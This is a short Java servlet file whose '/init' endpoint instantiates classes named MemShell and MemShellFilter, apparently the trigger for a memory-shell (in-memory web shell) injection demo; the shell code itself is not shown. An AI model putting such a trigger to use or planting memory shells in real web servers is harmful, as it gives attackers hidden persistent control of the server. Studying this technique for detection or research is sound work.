package com.server;

import com.server.Filter.MemShellFilter;
import com.server.servlet.MemShell;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.IOException;

@WebServlet("/init")
public class Init extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        try {
            MemShell memShell = new MemShell();
            MemShellFilter memShellFilter = new MemShellFilter();
        } catch (Exception e) {
            resp.getWriter().write("❌ Error: " + e.getMessage());
        }
    }
}